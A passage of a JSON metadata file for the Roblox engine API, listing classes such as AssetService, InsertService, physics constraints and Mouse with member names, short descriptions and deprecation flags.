model.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"JointsService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RunService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BadgeService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LogService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AssetService","Summary":"A service used to set and get information about assets stored on the Roblox website.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"RevertAsset","Summary":"Reverts a given place id to the version number provided. Returns true if successful on reverting, false otherwise.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetPlacePermissions","Summary":"Sets the permissions for a placeID to the place accessType. An optional table (inviteList) can be included that will set the accessType for only the player names provided. The table should be set up as an array of usernames (strings).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetPlacePermissions","Summary":"Given a placeID, this function will return a table with the permissions of the place. Useful for determining what kind of permissions a particular user may have for a place.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetAssetVersions","Summary":"Given a placeID, this function will return a table with the version info of the place. An optional arg of page number can be used to page through all revisions (a single page may hold about 50 revisions).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetCreatorAssetID","Summary":"Given a creationID, this function will return the asset that created the creationID. If no other asset created the given creationID, 0 is returned.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"HttpService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"HttpEnabled","Summary":"Enabling http requests from scripts","Browsable":"true","Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"InsertService","Summary":"A service used to insert objects stored on the website into the game.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"AllowClientInsertModels","Summary":"Can be set in non-filtering-enabled places to allow LoadAsset to be used in LocalScripts.","Browsable":"true","Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AllowInsertFreeModels","Summary":"Allows free models to be inserted into place.","Browsable":"false","Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"GetCollection","Summary":"Returns a table for the assets stored in the category.  A category is an setId from www.roblox.com that links to a set.  <a href=\"http://wiki.roblox.com/index.php?title=API:Class/InsertService/GetCollection\" target=\"_blank\">More info on table format</a>. <a href=\"http://wiki.roblox.com/index.php/Sets\" target=\"_blank\">More info on sets</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Insert","Summary":"Inserts the Instance into the workspace.  It is recommended to use Instance.Parent = game.Workspace instead, as this can cause issues currently.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ApproveAssetId","Summary":"Deprecated","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"ApproveAssetVersionId","Summary":"Deprecated","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"GetBaseSets","Summary":"Returns a table containing a list of the various setIds that are ROBLOX approved. <a href=\"http://wiki.roblox.com/index.php/Sets\" target=\"_blank\">More info on sets</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetUserSets","Summary":"Returns a table containing a list of the various setIds that correspond to argument 'userId'. <a href=\"http://wiki.roblox.com/index.php/Sets\" target=\"_blank\">More info on sets</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetBaseCategories","Summary":"Deprecated. Use GetBaseSets() instead.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"GetUserCategories","Summary":"Deprecated. Use GetUserSets() instead.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"LoadAsset","Summary":"Returns a Model containing the Instance that resides at AssetId on the web. This call will also yield the script until the model is returned. Script execution can still continue, however, if you use a <a href=\"http://wiki.roblox.com/index.php?title=Coroutine\" target=\"_blank\">coroutine</a>.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LoadAssetVersion","Summary":"Similar to LoadAsset, but instead an AssetVersionId is passed in, which refers to a particular version of the asset which is not neccessarily the latest version.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Hat","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":45,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"Accessory","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":32,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LocalBackpack","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LocalBackpackItem","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MotorFeature","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"Attachment","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":81,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Rotation","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WorldRotation","Summary":"Deprecated. Use WorldOrientation instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"Orientation","Summary":"Euler angles applied in YXZ order","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WorldOrientation","Summary":"Euler angles applied in YXZ order","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Constraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":86,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Enabled","Summary":"Toggles whether or not this constraint is enabled. Disabled constraints will not render in game.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Color","Summary":"The color of the in-game visual.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Visible","Summary":"Toggles the in-game visual associated with this constraint.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BallSocketConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":86,"Browsable":true,"PreferredParent":"","Members":[{"Name":"LimitsEnabled","Summary":"Enables the angular limit between the axis of Attachment0 and the axis of Attachment1.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UpperAngle","Summary":"Maximum angle between the two main axes. Value in [0, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Restitution","Summary":"Restitution of the limit, or how elastic it is. Value in [0, 1].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TwistLimitsEnabled","Summary":"Enables the angular limits around the main axis of Attachment1.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TwistUpperAngle","Summary":"Upper angular limit around the axis of Attachment1. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TwistLowerAngle","Summary":"Lower angular limit around the axis of Attachment1. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Radius","Summary":"Radius of the in-game visual. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RopeConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":89,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Length","Summary":"The length of the rope or the maximum distance between the two attachments. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Restitution","Summary":"Restitution of the rope, or how elastic it is. Value in [0, 1].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CurrentDistance","Summary":"Current distance between the two attachments. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Thickness","Summary":"The thickness of the in-game visual (diameter). Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RodConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":90,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Length","Summary":"The length of the rod or the distance to be maintained between the two attachments. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CurrentDistance","Summary":"Current distance between the two attachments. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Thickness","Summary":"The thickness of the in-game visual (diameter). Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SpringConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":91,"Browsable":true,"PreferredParent":"","Members":[{"Name":"LimitsEnabled","Summary":"Enables limits on the length of the spring.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Stiffness","Summary":"The stiffness parameter of the spring. Force is scaled based on distance from the free length. The units of this property are force / distance. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Damping","Summary":"The damping parameter of the spring. The force is scaled with respect to relative velocity. The units of this property are force / velocity. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FreeLength","Summary":"The distance (in studs) between the two attachments at which the spring exerts no stiffness force. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MaxForce","Summary":"The maximum force that the spring can apply. Useful to prevent instabilities. The units are mass * studs / seconds^2. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MaxLength","Summary":"Maximum spring length, or the maxium distance between the two attachments. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MinLength","Summary":"Minimum spring length, or the minimum distance between the two attachments. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Radius","Summary":"The radius of the in-game spring coil visual. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Thickness","Summary":"The thickness of the spring wire (diameter) in the in-game visual. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Coils","Summary":"The number of coils in the in-game visual. Value in [0, 8].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CurrentLength","Summary":"Current distance between the two attachments. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WeldConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":94,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"HingeConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":87,"Browsable":true,"PreferredParent":"","Members":[{"Name":"ActuatorType","Summary":"Type of the rotational actuator: None, Motor, or Servo.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LimitsEnabled","Summary":"Enables the angular limits on rotations around the main axis of Attachment0.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UpperAngle","Summary":"Upper limit for the angle from the SecondaryAxis of Attachment0 to the SecondaryAxis of Attachment1 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LowerAngle","Summary":"Lower limit for the angle from the SecondaryAxis of Attachment0 to the SecondaryAxis of Attachment1 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularRestitution","Summary":"Restitution of the two limits, or how elastic they are. Value in [0,1].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularVelocity","Summary":"The target angular velocity of the motor in radians per second around the rotation axis. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MotorMaxTorque","Summary":"The maximum torque the motor can apply to achieve the target angular velocity. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MotorMaxAcceleration","Summary":"The maximum angular acceleration of the motor in radians per second square. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularSpeed","Summary":"Target angular speed. This value is unsigned as the servo will always move toward its target. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ServoMaxTorque","Summary":"Maximum torque the servo motor can apply. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TargetAngle","Summary":"Target angle for the SecondaryAxis of Attachment1 from the SecondaryAxis of Attachment0 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CurrentAngle","Summary":"Signed angle between the SecondaryAxis of Attchement0 and the SecondaryAxis of Attachment1 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Radius","Summary":"Radius of the in-game visual. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SlidingBallConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":88,"Browsable":true,"PreferredParent":"","Members":[{"Name":"ActuatorType","Summary":"Type of linear actuator (along the axis of the slider): None, Motor, or Servo.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LimitsEnabled","Summary":"Enables the limits on the linear motion along the axis of the slider.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LowerLimit","Summary":"Lower limit for the position of Attachment1 with respect to Attachment0 along the slider axis. Value in (-inf, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UpperLimit","Summary":"Upper limit for the position of Attachment1 with respect to Attachment0 along the slider axis. Value in (-inf, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Restitution","Summary":"Restitution of the two limits, or how elastic they are. Value in [0, 1].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Velocity","Summary":"The target linear velocity of the motor in studs per second along the slider axis. Value in (-inf, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MotorMaxForce","Summary":"The maximum force the motor can apply to achieve the target velocity. Units are mass * studs / seconds^2. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MotorMaxAcceleration","Summary":"The maximum acceleration of the motor in studs per second squared. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Speed","Summary":"Target speed in studs per second. This value is unsigned as the servo will always move toward its target. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ServoMaxForce","Summary":"Maximum force the servo motor can apply. Units are mass * studs / seconds^2. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TargetPosition","Summary":"Target position of Attachment1 with respect to Attachment0 along the slider axis. Value in (-inf, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CurrentPosition","Summary":"Current position of Attachment1 with respect to Attachment0 along the slider axis. Value in (-inf, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Size","Summary":"Size of the in-game visual associated with this constraint. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PrismaticConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":88,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CylindricalConstraint","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":95,"Browsable":true,"PreferredParent":"","Members":[{"Name":"InclinationAngle","Summary":"Direction of the rotation axis as an angle from the x-axis in the xy-plane of Attachment0. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularActuatorType","Summary":"Type of angular actuator: None, Motor, or Servo.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularLimitsEnabled","Summary":"Enables the angular limits around the rotation axis.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UpperAngle","Summary":"Upper limit for the angle (in degrees) between the reference axis and the SecondaryAxis of Attachment1 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LowerAngle","Summary":"Lower limit for the angle (in degrees) between the reference axis and the SecondaryAxis of Attachment1 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularRestitution","Summary":"Restitution of the two limits, or how elastic they are. Value in [0, 1].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularVelocity","Summary":"The target angular velocity of the motor in radians per second around the rotation axis. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MotorMaxTorque","Summary":"The maximum torque the motor can apply to achieve the target angular velocity. The units are mass * studs^2 / second^2. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MotorMaxAngularAcceleration","Summary":"The maximum angular acceleration of the motor in radians per second squared. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AngularSpeed","Summary":"Target angular speed. This value is unsigned as the servo will always move toward its target. In radians per second. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ServoMaxTorque","Summary":"Maximum torque the servo motor can apply. The units are mass * studs^2 / second^2. Value in [0, inf).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TargetAngle","Summary":"Target angle (in degrees) between the reference axis and the secondary axis of Attachment1 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CurrentAngle","Summary":"Signed angle (in degrees) between the reference axis and the secondary axis of Attachment1 around the rotation axis. Value in [-180, 180].","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WorldRotationAxis","Summary":"The unit vector direction of the rotation axis in world coordinates.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RotationAxisVisible","Summary":"Enable the visibility of the rotation axis.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AlignOrientation","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":82,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"AlignPosition","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":82,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"VectorForce","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":82,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LineForce","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":82,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Torque","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":82,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Mouse","Summary":"Used to receive input from the user. Actually tracks mouse events and keyboard events.","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Hit","Summary":"The CoordinateFrame of where the Mouse ray is currently hitting a 3D object in the Workspace.  If the mouse is not over any 3D objects in the Workspace, this property is nil.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Icon","Summary":"The current Texture of the Mouse Icon. Stored as a string, for more information on how to format the string <a href=\"http://wiki.roblox.com/index.php/Content\" target=\"_blank\">go here</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Origin","Summary":"The CoordinateFrame of where the Mouse is when the mouse is not clicking.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Origin","Summary":"The CoordinateFrame of where the Mouse is when the mouse is not clicking.  This CoordinateFrame will be very close to the Camera.CoordinateFrame.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Target","Summary":"The Part the mouse is currently over. If the mouse is not currently over any object (on the skybox, for example) this property is nil.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TargetFilter","Summary":"A Part or Model that the Mouse will ignore when trying to find the Target, TargetSurface and Hit.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TargetSurface","Summary":"The NormalId (Top, Left, Down, etc.) of the face of the part the Mouse is currently over.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UnitRay","Summary":"The Unit Ray from where the mouse is (Origin) to the current Mouse.Target.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ViewSizeX","Summary":"The viewport's (game window) width in pixels.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ViewSizeY","Summary":"The viewport's (game window) height in pixels.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"X","Summary":"The absolute pixel position of the Mouse along the x-axis of the viewport (game window). Values start at 0 on the left hand side of the screen and increase to the right.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Y","Summary":"The absolute pixel position of the Mouse along the y-axis of the viewport (game window). Values start at 0 on the stop of the screen and increase to the bottom.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Button1Down","Summary":"Fired when the first button (usually the left, but could be another) on the mouse is depressed.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Button1Up","Summary":"Fired when the first button (usually the left, but could be another) on the mouse is release.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Button2Down","Summary":"This event is currently non-operational.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Button2Up","Summary":"This event is currently non-operational.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Idle","Summary":"Fired constantly when the mouse is not firing any other event (i.e. the mouse isn't moving, nor any buttons being pressed or depressed).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"KeyDown","Summary":"Fired when a user presses a key on the keyboard. Argument is a string representation of the key.  If the key has no string representation (such as space), the string passed in is the keycode for that character. Keycodes are currently in ASCII.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"KeyUp","Summary":"Fired when a user releases a key on the keyboard. Argument is a string representation of the key.  If the key has no string representation (such as space), the string passed in is the keycode for that character. Keycodes are currently in ASCII.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Move","Summary":"Fired when the mouse X or Y member changes.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WheelBackward","Summary":"This event is currently non-operational.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WheelForward","Summary":"This event is currently non-operational.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ProfilingItem","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ChangeHistoryService","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RotateP","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RotateV","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScriptContext","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Selection","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"VelocityMotor","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Weld","Summary":"","ExplorerOrder":20,"ExplorerImageIndex":34,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TaskScheduler","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"SetThreadShare","Summary":"Deprecated","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"StatsItem","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Snap","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FileMesh","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ClickDetector","Summary":"Raises mouse events for parent object","ExplorerOrder":3,"ExplorerImageIndex":41,"Browsable":true,"PreferredParent":"","Members":[{"Name":"MaxActivationDistance","Summary":"The maximum distance a Player's character can be from the ClickDetector's parent Part that will allow the Player's mouse to fire events on this object.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseClick","Summary":"Fired when a player clicks on the parent Part of ClickDetector. The argument provided is always of type Player.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseHoverEnter","Summary":"Fired when a player's mouse enters on the parent Part of ClickDetector. The argument provided is always of type Player.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MouseHoverLeave","Summary":"Fired when a player's mouse leaves the parent Part of ClickDetector. The argument provided is always of type Player.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Clothing","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Smoke","Summary":"Makes the parent part or model object emit smoke","ExplorerOrder":3,"ExplorerImageIndex":59,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Trail","Summary":"Makes two attachments emit trail when moving","ExplorerOrder":3,"ExplorerImageIndex":93,"Browsable":true,"PreferredParent":"","Members":[{"Name":"LightEmission","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Beam","Summary":"Makes beam between two attachments","ExplorerOrder":3,"ExplorerImageIndex":96,"Browsable":true,"PreferredParent":"","Members":[{"Name":"LightEmission","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ParticleEmitter","Summary":"A generic particle 